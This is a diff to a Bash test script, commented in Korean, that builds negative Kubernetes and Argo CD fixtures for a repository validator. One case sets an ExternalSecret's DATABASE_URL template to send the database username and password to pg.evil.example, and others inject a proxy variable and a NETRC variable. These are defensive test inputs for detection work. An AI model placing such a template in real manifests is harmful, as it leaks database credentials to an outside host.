@@ -16,7 +16,12 @@
 #                            — 같은 방식), 검사 11.3·11.4의 심볼릭 링크 케이스(fmt-dirsource-link — 링크는 커밋하지 않는다. 원본은 fixtures/fmt/link/.
 #                            링크를 만들 수 없는 환경에서는 이유를 적은 [SKIP]으로 건너뜀에 센다 — CI · 판정용 실행에서는 실패), 검사 11.5의
 #                            심볼릭 링크 케이스(fmt-symlink · fmt-symlink-nogit — 같은 방식. 원본은 fixtures/fmt/symlink/)와 인덱스 케이스의 임시
-#                            git 저장소(fmt-symlink-index — 작업 트리에는 일반 파일 · 인덱스에만 모드 120000).
+#                            git 저장소(fmt-symlink-index — 작업 트리에는 일반 파일 · 인덱스에만 모드 120000),
+#                            (T075) 검사 3.9 · 7.1 · 7.5 · 11.6 · 11.7 · 13.7 · 14의 임시 트리(케이스 이름 = 설계 D9 표의 부정 픽스처 이름 · GP-1 리뷰 재현 — positive의 앱 부분
+#                            사본에 변이 하나: JSON6902 패치 · yq -i · 파일 하나. 커밋되는 픽스처 디렉터리를 72개 더 두지 않는다 — 아래 「T075」 절),
+#                            검사 1 「네트워크 없는 렌더」의 kustomize 심 디렉터리(nonet-bin — build마다 차단 env를 찍고 실패한다)와
+#                            승인 관문 classify의 자기 시험 저장소(classify-* — .github/workflows/validate.yml의 스텝 classify `run:` 글자를 yq로 꺼내
+#                            임시 git 저장소에서 그대로 돌린다).
 #                            --root는 저장소 안이어야 하므로 여기에 만든다(.gitignore 대상). 시작할 때와 끝날 때(EXIT trap) 통째로 지운다
 # 실제 트리 검사(validate.sh 기본 실행)는 tests/ 를 제외하므로 픽스처가 실제 결과에 섞이지 않는다.
 #
@@ -182,13 +187,26 @@ positive_asserts=('+[PASS] 2 APP-SSA' '+[PASS] 3 ES' '+[PASS] 3.5 ES-⑤⑥' '+[
   '+[PASS] 9.1 CSS-set' '+[PASS] 9.2 CSS-auth' '+[PASS] 9.3 CSS-k8s' '+[PASS] 9.4 CSS-conditions'
   # 검사 11 · 12(T047): directory source 경로는 root가 읽는 clusters/oci-k3s/apps 하나(Application 24 = 앱 2 + 플랫폼 22) · helmCharts 없음
   #   (T059) 플랫폼 22번째 platform-tests의 source.path platform/policies/tests는 이 부분 트리에 없다 → 11.3 "트리에 없음 1"
+  #   (T075) Application은 파일 하나에 문서 하나다(validate 14.0) — 11.4의 YAML 파일 수 = 문서 수 = 24
   '+[PASS] 11.1 FMT-list' '+[PASS] 11.2 FMT-appset'
   '+[PASS] 11.3 FMT-dirsource — directory source 경로 1개(clusters/oci-k3s/apps) — .json·.jsonnet·.libsonnet 파일·하위 디렉터리 없음 · Application source.path 25개 = directory source 1 · kustomization 23 · 트리에 없음 1'
-  '+[PASS] 11.4 FMT-dirsource-kind — directory source 경로 1개의 YAML 파일 2개 · 문서 24개 모두 Application(argoproj.io/…) · 빈 문서 0개 건너뜀'
+  '+[PASS] 11.4 FMT-dirsource-kind — directory source 경로 1개의 YAML 파일 24개 · 문서 24개 모두 Application(argoproj.io/…) · 빈 문서 0개 건너뜀'
   # 11.5: 링크 0 — 항목 수는 단언하지 않는다(인덱스 항목 수는 픽스처가 커밋됐는지에 따라 로컬과 CI가 다르다)
   '+[PASS] 11.5 FMT-symlink — 심볼릭 링크 0개 — 작업 트리 항목 '
   '+[PASS] 12.1 HELM-repo' '+[PASS] 12.2 HELM-version' '+[PASS] 12.3 HELM-legacy'
   '+[PASS] 12.4 HELM-argocd — helmCharts를 쓰는 kustomization 0개 — 대상 없음' '+[PASS] 12.5 HELM-chartsdir'
+  # 7.5 · 14.8(T075): yq만 쓴다 — platform/argocd는 자리표시 · apps/** kustomization 셋(base · overlays dev · prod)의 경로 항목 12개(base 8 · dev 1 · prod 3)
+  '+[PASS] 7.5 WAVE-argocd-placeholder — platform/argocd/kustomization.yaml = 자리표시(최상위 키 {apiVersion, kind, resources} · resources [])'
+  #   (T075 보정 2026-11-18 — 재검토 G1A-8) helmCharts · secretGenerator 0은 apps/** 범위의 말이다 · tests 범위는 최상위 키 집합으로 본다 ·
+  #   (마지막 재검토 G1B-6) tests 범위 항목은 같은 디렉터리의 파일뿐이다
+  '+[PASS] 14.8 APP-remote — kustomization 3개(apps/** 3 · platform/policies/tests/** 0) · 경로 항목 12개: 원격 ref 0 · apps/** 경로 가둠(overlay = 같은 디렉터리 파일 + ../../base · base = 같은 디렉터리 파일) · apps/** helmCharts · secretGenerator 0 · 모두 저장소 안 실재 경로 · 인라인 generator · transformer · validator 0(인라인 전략 병합 패치 0개는 경로 아님) · platform/policies/tests/** 최상위 키 ⊆ {apiVersion, kind, namespace, resources} · 항목 = 같은 디렉터리의 파일(resources[] 문자열)'
+  # 11.6 · 11.7 · 14.9(T075 보정 2026-11-18 — yq만 · 11.6은 도구 없이): 모든 kustomization의 최상위 키 = 정본 철자 · 경로를 받는 구조체 항목의
+  #   직속 키 = 정본 철자(파일 · 키 수는 단언하지 않는다 — 픽스처가 늘면 바뀐다) · clusters/oci-k3s/apps 바로 아래 = *.yaml 24개뿐 · 앱 kustomization 셋
+  #   (base 1 · overlay 2)의 키 = 계약 집합(모든 깊이 — 재검토 G1B-4)
+  '+[PASS] 11.7 FMT-kust-keys — kustomization 파일 '
+  '+· 병합 키 · 태그 0 · 중첩(경로를 받는 구조체 항목 '
+  '+[PASS] 11.6 FMT-dirsource-files — clusters/oci-k3s/apps 바로 아래 항목 24개 = *.yaml · *.yml 24개 · README.md 0개 — kustomization 파일 · 다른 확장자 · 하위 디렉터리 0'
+  '+[PASS] 14.9 APP-kust-keys — 앱 kustomization 3개(base 1 · overlay 2): base 키 = {apiVersion, kind, resources} · overlay 키 ⊆ {apiVersion, kind, namespace, resources, images, patches} · 모든 깊이: resources[] 문자열 · images[] 키 ⊆ {name, newName, digest} · patches[] 키 ⊆ {target, patch} · patches[].target 키 ⊆ {group, version, kind, name, namespace, labelSelector, annotationSelector} · 그 밖 자리의 맵 · 목록 0'
   '+결과: PASS' '-[FAIL]')
 if command -v kustomize >/dev/null 2>&1 && command -v kubeconform >/dev/null 2>&1; then
   # 5.6 PASS 줄의 소스 수는 kustomize 유무로 갈린다(SKIP 모드에서는 "렌더 0" — 한계 절 참조)
@@ -201,7 +219,21 @@ if command -v kustomize >/dev/null 2>&1 && command -v kubeconform >/dev/null 2>&
     # 검사 10(T046): 긍정 트리의 platform/reloader는 순수 매니페스트라 helm 없이 렌더된다(kustomize만 필요).
     '+[PASS] 10 REL — platform/reloader (rendered): ClusterRole·ClusterRoleBinding 0 · Deployment reloader/reloader args = ["--log-level=info","--namespaces=identity,jt-dev,jt-prod,reloader","--reload-strategy=annotations"] · kind {ServiceAccount 1 · Deployment 1 · Role 5 · RoleBinding 5}(합계 12) · Role·RoleBinding ns 집합 = {identity,jt-dev,jt-prod,reloader} · RoleBinding → 같은 ns의 Role · 주체 = ServiceAccount reloader/reloader · reloader-role 규칙 동일·와일드카드 없음 · Reloader 이미지 컨테이너 1개(containers.0 · command 없음)'
     # 검사 13(T047 G4b): 긍정 트리의 RBAC는 platform/reloader의 Role 5 · RoleBinding 5뿐이다(기준선 밖의 것 없음 · 부분 트리라 완전성은 보지 않는다)
-    '+[PASS] 13 RBAC — 렌더 27개 합산(부분 트리 — 기준선 밖의 것만 본다) — Role 5 · ClusterRole 0 · 바인딩 5장(RoleBinding 5 · ClusterRoleBinding 0) · 주체 5개 모두 이름을 다 적은 ServiceAccount · 토큰 발급 규칙을 가진 역할 0개(없음) · 렌더되지 않은 ClusterRole을 가리키는 바인딩 0장(없음) · Role을 가리키는 RoleBinding 5장 모두 같은 ns의 렌더된 Role · 내장 역할 이름의 ClusterRole 0 · aggregationRule 0 · aggregate-to-* 라벨 ClusterRole 0개(없음) · Reloader 주체(ServiceAccount reloader/reloader) 바인딩은 platform/reloader 렌더에만 — 그 렌더 안 5장(장수·모양은 검사 10)')
+    #   (T075) 렌더 28 = clusters/oci-k3s/projects(AppProject dev · prod — 13.7 통과 갈래)가 더해졌다
+    '+[PASS] 13 RBAC — 렌더 28개 합산(부분 트리 — 기준선 밖의 것만 본다) — Role 5 · ClusterRole 0 · 바인딩 5장(RoleBinding 5 · ClusterRoleBinding 0) · 주체 5개 모두 이름을 다 적은 ServiceAccount · 토큰 발급 규칙을 가진 역할 0개(없음) · 렌더되지 않은 ClusterRole을 가리키는 바인딩 0장(없음) · Role을 가리키는 RoleBinding 5장 모두 같은 ns의 렌더된 Role · 내장 역할 이름의 ClusterRole 0 · aggregationRule 0 · aggregate-to-* 라벨 ClusterRole 0개(없음) · Reloader 주체(ServiceAccount reloader/reloader) 바인딩은 platform/reloader 렌더에만 — 그 렌더 안 5장(장수·모양은 검사 10)'
+    # 3.9 · 13.7 · 14.0–14.7(T075 · 계약 §validate.yml 3 · 4 「(T075 보정 2026-11-17)」): 앱 부분은 모노레포 deploy/base 9파일 바이트 사본 + overlays dev · prod
+    #   (렌더 객체 dev 8 · prod 10 — admin Ingress · Middleware는 prod만) + Application 파일 둘. ES: 원본 2(base) · 렌더 6(base · dev · prod 각 2) — overlay 렌더 4.
+    #   AppProject: clusters/oci-k3s/projects 렌더 2 + 원본 2(이 트리의 bootstrap/argocd는 resources: []). 14.5 객체 39 = 원본 13(base 9 · dev 1 · prod 3) + 렌더 26.
+    '+[PASS] 3.9 ES-app — apps/** ExternalSecret 8개(원본 2 · 렌더 6): dataFrom · templateFrom 없음 · target.template 있음 · mergePolicy Merge 아님 · refreshInterval 5m · refreshPolicy Periodic · creationPolicy Owner · overlay 렌더 ExternalSecret 4개 = pod 표(이름 · store · data[] · 항목 키 · template = base)'
+    '+[PASS] 13.7 RBAC-appproject — AppProject 4개(렌더 2 · 원본 2) 모두 clusters/oci-k3s/projects · bootstrap/argocd에만 · 렌더의 dev/prod 2개 = 계약 꼴(허용 목록 8종 · 금지 ⊇ 6종 · destination 하나 · clusterResourceWhitelist [])'
+    '+[PASS] 14.0 APP-app — clusters/oci-k3s/apps 파일 24개: 문서 하나 · kind Application · metadata.name = 파일 이름 — 앱 Application 2개: 계약 꼴(namespace argocd · finalizer · project = env · destination · spec 키 · syncPolicy) · source.path 렌더 2개의 객체 18개 ns = jt-<env> · cluster 범위 0'
+    '+[PASS] 14.1 APP-env — overlay 렌더 2개 · pod 템플릿 객체 6개 · 컨테이너 10개: 금지 env 0 · 렌더 밖 ConfigMap·Secret 참조 0 · <pod>-migrate 참조는 PreSync Job <pod>-migrate 안에만 · envFrom · env[] = pod 표'
+    '+[PASS] 14.2 APP-cm — overlay 렌더 2개 중 pod 템플릿 객체 있음 2개: ConfigMap <pod>-config 하나 · 키 집합 = pod 표 · 값 꼴(PLACEHOLDER- 0 · ENV · ALLOWED_HOSTS · KAFKA_USERNAME · ACCESS_*) · 대상 없음 0개(대상 0)'
+    '+[PASS] 14.3 APP-ingress — overlay 렌더 2개 · Ingress 3개(m2m 2 · admin 1) · Middleware 1개 = pod 표(이름 · class · entrypoints · tls · backend · host · 경로 · stripPrefix)'
+    '+[PASS] 14.4 APP-values — overlay 렌더 2개 중 pod 템플릿 객체 있음 2개: ConfigMap 값 = pod 표(env별) · 면제 상한 · dev ≠ prod 1쌍 · 대상 없음 0개(대상 0)'
+    '+[PASS] 14.5 APP-hook — apps/** · platform/policies/tests/** 객체 39개(원본 13 · 렌더 26): helm.sh/hook 0 · argocd hook = PreSync뿐 — ExternalSecret · Job <pod>-migrate 8개'
+    '+[PASS] 14.6 APP-image — overlay 렌더 2개 · 컨테이너 10개 모두 ghcr.io/joshua92y/<pod>@sha256:<64 hex>'
+    '+[PASS] 14.7 APP-kinds — overlay 렌더 2개 · 객체 18개 모두 AppProject dev/prod 허용 목록 8종 · Secret 0 · Service 2개 ClusterIP(externalIPs · loadBalancerIP · nodePort 0)')
 else
   positive_asserts+=('+webhook 정책을 담은 소스: 원본 1 · 렌더 0')
 fi
@@ -1254,6 +1286,862 @@ else
   rb_root_case rbac-root-missing '' 1 '+[SKIP] 13 RBAC — 도구 없음(kustomize)'
 fi
 
+# --- T075 · 앱 렌더 검사(3.9 · 14.0–14.8) · Argo CD 자기 관리 경로(7.1 · 7.5) · AppProject(13.7) — 임시 트리(tests/.tmp) -------------------
+# 계약 §validate.yml 3 · 4 · 6 「(T075 보정 2026-11-17)」. 검사 번호 · 이름 · FAIL 조건의 정본은 설계 design/t075-design.md D9이고 케이스 이름은 그 표의
+# 부정 픽스처 이름이다(앞에 붙인 것 없음). 트리는 커밋하지 않고 tests/.tmp/<케이스>에 만든다 — 결함이 positive 앱 부분 위의 변이 한두 줄이라서다:
+#   ap_app이 positive의 앱 부분(apps/identity-admin · clusters/oci-k3s/apps/identity-admin-{dev,prod}.yaml)을 복사하고, 케이스마다 ap_patch(overlay
+#   kustomization의 patches 끝에 패치 하나 — JSON6902 또는 전략 병합) · ap_yq(yq -i) · ap_put(파일) · ap_res(resources 끝에 항목)로 결함을 넣는다.
+#   변이 없는 사본 app-base-ok가 새 코드 전부 PASS임을 먼저 단언한다 — 그래서 변이 케이스의 FAIL은 그 변이에서만 온다(격리).
+# 모든 트리가 부분 트리다(5.x 등이 FAIL — exit 1은 판정 근거가 아니다). 근거는 `+[FAIL] <코드> — …` 고유 단언 · 그 코드의 그룹 PASS 줄이 없다는
+# `-[PASS] <코드>` · 다른 새 코드로 번지지 않는다는 `-[FAIL] <코드>`(ap_neg)다. 결함이 여러 코드에 걸리는 것이 정답인 케이스는 ap_neg에 그 코드를 함께 준다.
+# 렌더를 보므로 kustomize가 없으면 SKIP이 정답이다(아래 else). helm은 쓰지 않는다(tests-helm-values의 helmCharts는 14.8 키 판정 대상일 뿐이다 —
+# 렌더는 실패한다). 원격 ref 케이스는 example.invalid이고 validate.sh가 apps/** · tests/** 렌더를 네트워크 없이 돌린다(검사 1 「네트워크 없는 렌더」 —
+# 닫힌 로컬 프록시 · git 원격 프로토콜 금지). 그 밖의 범위에서 원격을 끄는 케이스는 AP_NONET(같은 차단을 validate.sh 전체에)으로 돈다. 검사 14.8 ·
+# 11.7 · 14.9는 렌더 전에 원본을 본다.
+AP_ROOT=''
+AP_FIX="$FIX/positive"
+AP_OV='apps/identity-admin/overlays'
+AP_DEV="$AP_OV/dev (rendered)"
+AP_PROD="$AP_OV/prod (rendered)"
+AP_ALL=('3.9 ES-app' '7.5 WAVE-argocd-placeholder' '13.7 RBAC-appproject' '14.0 APP-app' '14.1 APP-env' '14.2 APP-cm' '14.3 APP-ingress'
+  '14.4 APP-values' '14.5 APP-hook' '14.6 APP-image' '14.7 APP-kinds' '14.8 APP-remote'
+  '11.7 FMT-kust-keys' '11.6 FMT-dirsource-files' '14.9 APP-kust-keys')   # 뒤 셋 = T075 보정 2026-11-18(GP-1 리뷰 · 11.7은 번호 정정 — 처음 11.5)
+ap_neg() { # <이 케이스가 거는 코드…(예: '14.3 APP-ingress')> → 전역 AP_NEG: 그 코드의 그룹 PASS 줄 없음 + 그 밖 새 코드의 FAIL 없음
+  local a c keep
+  AP_NEG=()
+  for c in "$@"; do AP_NEG+=("-[PASS] $c"); done
+  for a in "${AP_ALL[@]}"; do
+    keep=1
+    for c in "$@"; do [[ $a == "$c" ]] && keep=0; done
+    [[ $keep == 0 ]] || AP_NEG+=("-[FAIL] $a")
+  done
+}
+ap_new() { # <케이스> — 빈 임시 트리 → 전역 AP_ROOT
+  AP_ROOT="$TMP/$1"
+  rm -rf -- "$AP_ROOT" && mkdir -p "$AP_ROOT"
+}
+ap_app() { # <케이스> — positive의 앱 부분 사본(apps/identity-admin + Application 파일 둘)
+  ap_new "$1" || return 1
+  mkdir -p "$AP_ROOT/apps" "$AP_ROOT/clusters/oci-k3s/apps" || return 1
+  cp -R "$AP_FIX/apps/identity-admin" "$AP_ROOT/apps/" || return 1
+  cp "$AP_FIX/clusters/oci-k3s/apps/identity-admin-dev.yaml" "$AP_FIX/clusters/oci-k3s/apps/identity-admin-prod.yaml" "$AP_ROOT/clusters/oci-k3s/apps/"
+}
+ap_put() { # <트리 기준 파일> <줄>... — 파일을 쓴다(줄마다 개행 · 디렉터리를 만든다)
+  local f="$AP_ROOT/$1"; shift
+  mkdir -p "$(dirname "$f")" && printf '%s\n' "$@" > "$f"
+}
+ap_yq() { # <트리 기준 파일> <yq 식> — 제자리 변경
+  yq -i "$2" "$AP_ROOT/$1"
+}
+ap_res() { # <트리 기준 kustomization> <항목> — resources 끝에 항목 하나
+  AP_PR=$2 yq -i '.resources += [strenv(AP_PR)]' "$AP_ROOT/$1"
+}
+ap_patch() { # <dev|prod> <target kind> <target name> <패치 줄>... — overlay kustomization의 patches 끝에 패치 하나(줄을 개행으로 잇는다)
+  local ov=$1 k=$2 n=$3 p; shift 3
+  p=$(printf '%s\n' "$@")
+  AP_PK=$k AP_PN=$n AP_PP=$p yq -i '.patches += [{"target": {"kind": strenv(AP_PK), "name": strenv(AP_PN)}, "patch": strenv(AP_PP)}]' \
+    "$AP_ROOT/$AP_OV/$ov/kustomization.yaml"
+}
+ap_case() { # <케이스> <기대 exit> [단언...] — 트리는 apb_<케이스(- → _)>가 만든다. 필터 밖이면 건너뜀으로 센다. 트리를 만들지 못하면 fail_case
+  local name=$1 build="apb_${1//-/_}"; shift
+  if ! any_selected "$name"; then skip_cases "$name"; return 0; fi
+  mkdir -p "$TMP"
+  if "$build" "$name" 2>>"$TMP/app.log"; then
+    run_case "$name" "$AP_ROOT" "$@"
+  else
+    fail_case "$name" "임시 트리를 만들 수 없음 — $(tr -d '\r' < "$TMP/app.log" | tail -n 3 | tr '\n' ' ')"
+  fi
+}
+# 자주 쓰는 패치 조각 — Deployment identity-admin의 web(containers/0)에 env 하나 · 컨테이너 하나 더하기
+ap_web_env() { ap_patch dev Deployment identity-admin '- op: add' '  path: /spec/template/spec/containers/0/env/-' '  value:' "    name: $2" "    value: $3"; }
+AP_CM_REF=('      envFrom:' '        - configMapRef:' '            name: identity-admin-config' '        - secretRef:' '            name: identity-admin-env')
+ap_add_container() { # <이름> <image> [env 이름 env 값] — Deployment identity-admin에 컨테이너 하나(envFrom은 pod 표 그대로)
+  local -a l=('- op: add' '  path: /spec/template/spec/containers/-' '  value:' "    name: $1" "    image: $2" "${AP_CM_REF[@]/#      /    }")
+  [[ -z ${3:-} ]] || l+=('    env:' "      - name: $3" "        value: $4")
+  ap_patch dev Deployment identity-admin "${l[@]}"
+}
+
+# (기준) 변이 없는 사본 · 뼈대 overlay(렌더 0객체 — 14.2 · 14.4 대상 0) · 표에 없는 pod
+apb_app_base_ok() { ap_app "$1"; }
+apb_app_skeleton() {
+  ap_new "$1" || return 1
+  ap_put apps/identity-admin/base/kustomization.yaml 'apiVersion: kustomize.config.k8s.io/v1beta1' 'kind: Kustomization' 'resources: []' || return 1
+  ap_put "$AP_OV/dev/kustomization.yaml" 'apiVersion: kustomize.config.k8s.io/v1beta1' 'kind: Kustomization' 'resources: []' 'images:' \
+    '  - name: ghcr.io/joshua92y/identity-admin' '    newName: ghcr.io/joshua92y/identity-admin' \
+    '    digest: sha256:0000000000000000000000000000000000000000000000000000000000000000' || return 1
+  ap_put "$AP_OV/prod/kustomization.yaml" 'apiVersion: kustomize.config.k8s.io/v1beta1' 'kind: Kustomization' 'resources: []'
+}
+apb_app_unknown_pod() {
+  ap_new "$1" || return 1
+  ap_put apps/blog/overlays/dev/kustomization.yaml 'apiVersion: kustomize.config.k8s.io/v1beta1' 'kind: Kustomization' 'namespace: jt-dev' \
+    'resources:' '  - configmap.yaml' || return 1
+  ap_put apps/blog/overlays/dev/configmap.yaml 'apiVersion: v1' 'kind: ConfigMap' 'metadata:' '  name: blog-config' 'data:' '  ENV: dev'
+}
+# 3.9 ES-app
+apb_es_app_datafrom() { ap_app "$1" && ap_patch dev ExternalSecret identity-admin-env '- op: add' '  path: /spec/dataFrom' '  value:' \
+  '    - extract:' '        key: dev/db/dev_identity_admin/app'; }
+apb_es_app_merge() { ap_app "$1" && ap_patch dev ExternalSecret identity-admin-env '- op: replace' '  path: /spec/target/template/mergePolicy' '  value: Merge'; }
+apb_es_app_refresh() { ap_app "$1" && ap_patch dev ExternalSecret identity-admin-env '- op: replace' '  path: /spec/refreshInterval' '  value: 1h'; }
+apb_es_app_admin_key() { ap_app "$1" && ap_patch dev ExternalSecret identity-admin-env '- op: replace' '  path: /spec/data/3/remoteRef/key' \
+  '  value: dev/dragonfly/admin'; }
+apb_es_app_other_pod() { ap_app "$1" && ap_patch dev ExternalSecret identity-admin-env '- op: replace' '  path: /spec/data/0/remoteRef/key' \
+  '  value: dev/db/dev_blog/app'; }
+apb_es_app_extra_es() {
+  ap_app "$1" || return 1
+  ap_put "$AP_OV/dev/externalsecret-extra.yaml" 'apiVersion: external-secrets.io/v1' 'kind: ExternalSecret' 'metadata:' '  name: identity-admin-extra' \
+    'spec:' '  refreshInterval: 5m' '  refreshPolicy: Periodic' '  secretStoreRef:' '    kind: ClusterSecretStore' '    name: vault-dev' '  target:' \
+    '    name: identity-admin-extra' '    creationPolicy: Owner' '    template:' '      engineVersion: v2' '      mergePolicy: Replace' '      data:' \
+    "        EXTRA: '{{ .extra }}'" '  data:' '    - secretKey: extra' '      remoteRef:' '        key: dev/django/identity-admin' '        property: secret_key' \
+    || return 1
+  ap_res "$AP_OV/dev/kustomization.yaml" externalsecret-extra.yaml
+}
+apb_es_app_template_host() { ap_app "$1" && ap_patch dev ExternalSecret identity-admin-env '- op: replace' '  path: /spec/target/template/data/DATABASE_URL' \
+  "  value: 'postgresql://{{ .db_username }}:{{ .db_password }}@pg.evil.example:5432/x?sslmode=disable'"; }
+apb_es_app_item_sourceref() { ap_app "$1" && ap_patch dev ExternalSecret identity-admin-env '- op: add' '  path: /spec/data/0/sourceRef' '  value:' \
+  '    storeRef:' '      kind: ClusterSecretStore' '      name: vault-prod'; }
+# 14.0 APP-app
+AP_APPDEV='clusters/oci-k3s/apps/identity-admin-dev.yaml'
+apb_app_project_platform() { ap_app "$1" && ap_yq "$AP_APPDEV" '.spec.project = "platform"'; }
+apb_app_dest_crossenv() { ap_app "$1" && ap_yq "$AP_APPDEV" '.spec.destination.namespace = "jt-prod"'; }
+apb_app_overlay_clusterkind() {
+  ap_app "$1" || return 1
+  ap_put "$AP_OV/dev/clusterrole.yaml" 'apiVersion: rbac.authorization.k8s.io/v1' 'kind: ClusterRole' 'metadata:' '  name: app-extra' 'rules:' \
+    '  - apiGroups: [""]' '    resources: [configmaps]' '    verbs: [get]' || return 1
+  ap_res "$AP_OV/dev/kustomization.yaml" clusterrole.yaml
+}
+apb_app_file_name_mismatch() {
+  ap_app "$1" || return 1
+  cp "$AP_FIX/clusters/oci-k3s/apps/identity-admin-prod.yaml" "$AP_ROOT/clusters/oci-k3s/apps/blog.yaml" || return 1
+  ap_yq clusters/oci-k3s/apps/blog.yaml '.metadata.name = "blog-prod" | .spec.source.path = "apps/blog/overlays/prod"'
+}
+apb_app_file_two_docs() {
+  ap_app "$1" || return 1
+  { cat "$AP_FIX/clusters/oci-k3s/apps/identity-admin-dev.yaml"; printf -- '---\n'; cat "$AP_FIX/clusters/oci-k3s/apps/identity-admin-prod.yaml"; } \
+    > "$AP_ROOT/clusters/oci-k3s/apps/identity-admin.yaml" || return 1
+  rm -f "$AP_ROOT/$AP_APPDEV" "$AP_ROOT/clusters/oci-k3s/apps/identity-admin-prod.yaml"
+}
+apb_app_ns_not_argocd() { ap_app "$1" && ap_yq "$AP_APPDEV" '.metadata.namespace = "jt-dev"'; }
+# 14.1 APP-env
+apb_env_forbidden() { ap_app "$1" && ap_web_env x NETRC /tmp/netrc; }
+apb_env_proxy() { ap_app "$1" && ap_web_env x https_proxy http://proxy.example.invalid:3128; }
+apb_env_outside_ref() { ap_app "$1" && ap_patch dev Deployment identity-admin '- op: replace' '  path: /spec/template/spec/containers/1/env/0' '  value:' \
+  '    name: POD_NAMESPACE' '    valueFrom:' '      configMapKeyRef:' '        name: outside-cm' '        key: ns'; }
+apb_migrate_ref_projected() { ap_app "$1" && ap_patch dev Deployment identity-admin '- op: add' '  path: /spec/template/spec/volumes/-' '  value:' \
+  '    name: owner' '    projected:' '      sources:' '        - secret:' '            name: identity-admin-migrate'; }
+apb_migrate_ref_pod() {
+  ap_app "$1" || return 1
+  ap_put "$AP_OV/dev/pod-debug.yaml" 'apiVersion: v1' 'kind: Pod' 'metadata:' '  name: identity-admin-debug' 'spec:' '  automountServiceAccountToken: false' \
+    '  containers:' '    - name: debug' '      image: ghcr.io/joshua92y/identity-admin' '      envFrom:' '        - secretRef:' '            name: identity-admin-migrate' \
+    || return 1
+  ap_res "$AP_OV/dev/kustomization.yaml" pod-debug.yaml
+}
+apb_env_literal_override() { ap_app "$1" && ap_web_env x ACCESS_EXPECTED_CN 00000000000000000000000000000000.access; }
+apb_envfrom_extra_cm() {
+  ap_app "$1" || return 1
+  ap_put "$AP_OV/dev/configmap-extra.yaml" 'apiVersion: v1' 'kind: ConfigMap' 'metadata:' '  name: identity-admin-extra' 'data:' '  EXTRA_FLAG: "1"' || return 1
+  ap_res "$AP_OV/dev/kustomization.yaml" configmap-extra.yaml || return 1
+  ap_patch dev Deployment identity-admin '- op: add' '  path: /spec/template/spec/containers/0/envFrom/-' '  value:' '    configMapRef:' \
+    '      name: identity-admin-extra'
+}
+apb_es_template_overrides_cm() { ap_app "$1" && ap_patch dev ExternalSecret identity-admin-env '- op: add' \
+  '  path: /spec/target/template/data/ACCESS_AUD_M2M' "  value: '{{ .secret_key }}'"; }
+apb_env_sidecar_extra() { ap_app "$1" && ap_add_container sidecar ghcr.io/joshua92y/identity-admin EXTRA_MODE debug; }
+# 14.2 APP-cm
+AP_CMDEV="$AP_DEV ConfigMap/jt-dev/identity-admin-config"
+ap_cm() { # <dev|prod> <키> <값 줄> — ConfigMap 값 하나를 바꾼다(JSON6902 replace)
+  ap_patch "$1" ConfigMap identity-admin-config '- op: replace' "  path: /data/$2" "  value: $3"
+}
+apb_cm_missing() { ap_app "$1" && ap_patch dev ConfigMap identity-admin-config '$patch: delete' 'apiVersion: v1' 'kind: ConfigMap' 'metadata:' \
+  '  name: identity-admin-config'; }
+apb_cm_placeholder() { ap_app "$1" && ap_cm dev ACCESS_AUD_M2M PLACEHOLDER-SET-IN-OVERLAY; }
+apb_cm_aud_form() { ap_app "$1" && ap_cm dev ACCESS_AUD_M2M '"000000000000000000000000000000000000000000000000000000000000000"'; }
+apb_cm_cn_form() { ap_app "$1" && ap_cm dev ACCESS_EXPECTED_CN web-bff-dev; }
+apb_cm_extra_key() { ap_app "$1" && ap_patch dev ConfigMap identity-admin-config '- op: add' '  path: /data/EXTRA_FLAG' '  value: "1"'; }
+apb_cm_second_configmap() {
+  ap_app "$1" || return 1
+  ap_put "$AP_OV/dev/configmap-second.yaml" 'apiVersion: v1' 'kind: ConfigMap' 'metadata:' '  name: identity-admin-second' 'data:' '  EXTRA_FLAG: "1"' || return 1
+  ap_res "$AP_OV/dev/kustomization.yaml" configmap-second.yaml
+}
+# 14.3 APP-ingress
+AP_ING_PATHS=('    http:' '      paths:' '        - path: /webhooks' '          pathType: Prefix' '          backend:' '            service:' '              name: identity-admin' \
+  '              port:' '                name: http')
+ap_ingress() { # <트리 기준 파일> <이름> <host> — Ingress 하나(class · entrypoints · tls는 계약 꼴 · 경로 /webhooks 하나)
+  ap_put "$1" 'apiVersion: networking.k8s.io/v1' 'kind: Ingress' 'metadata:' "  name: $2" '  annotations:' \
+    '    traefik.ingress.kubernetes.io/router.entrypoints: websecure' '    traefik.ingress.kubernetes.io/router.tls: "true"' 'spec:' \
+    '  ingressClassName: traefik' '  rules:' "    - host: $3" "${AP_ING_PATHS[@]/#/  }"
+}
+apb_ing_host_alias() { ap_app "$1" && ap_patch dev Ingress identity-admin '- op: replace' '  path: /spec/rules/0/host' '  value: blog-m2m-dev.joshuatech.dev'; }
+apb_ing_extra_path() { ap_app "$1" && ap_patch dev Ingress identity-admin '- op: add' '  path: /spec/rules/0/http/paths/-' '  value:' '    path: /webhooks' \
+  '    pathType: Prefix' '    backend:' '      service:' '        name: identity-admin' '        port:' '          name: http'; }
+apb_ing_admin_in_dev() {
+  ap_app "$1" || return 1
+  cp "$AP_ROOT/$AP_OV/prod/ingress-admin.yaml" "$AP_ROOT/$AP_OV/dev/ingress-admin.yaml" || return 1
+  ap_res "$AP_OV/dev/kustomization.yaml" ingress-admin.yaml
+}
+apb_ing_priority() { ap_app "$1" && ap_patch dev Ingress identity-admin '- op: add' '  path: /metadata/annotations/traefik.ingress.kubernetes.io~1router.priority' \
+  '  value: "100"'; }
+apb_mw_extra_prefix() { ap_app "$1" && ap_patch prod Middleware identity-admin-strip '- op: add' '  path: /spec/stripPrefix/prefixes/-' '  value: /x'; }
+apb_ing_third_name() {
+  ap_app "$1" || return 1
+  ap_ingress "$AP_OV/dev/ingress-x.yaml" identity-admin-x identity-m2m-dev.joshuatech.dev || return 1
+  ap_res "$AP_OV/dev/kustomization.yaml" ingress-x.yaml
+}
+apb_ing_admin_entrypoint_web() { ap_app "$1" && ap_patch prod Ingress identity-admin-admin '- op: replace' \
+  '  path: /metadata/annotations/traefik.ingress.kubernetes.io~1router.entrypoints' '  value: web'; }
+apb_ing_only_foreign_host() {
+  ap_app "$1" || return 1
+  ap_ingress "$AP_OV/dev/ingress-foreign.yaml" identity-admin vault.joshuatech.dev || return 1
+  ap_put "$AP_OV/dev/kustomization.yaml" 'apiVersion: kustomize.config.k8s.io/v1beta1' 'kind: Kustomization' 'namespace: jt-dev' 'resources:' \
+    '  - ingress-foreign.yaml'
+}
+# 14.4 APP-values
+apb_val_writes_prod_false() { ap_app "$1" && ap_cm prod AUTHENTIK_WRITES_ENABLED '"false"'; }
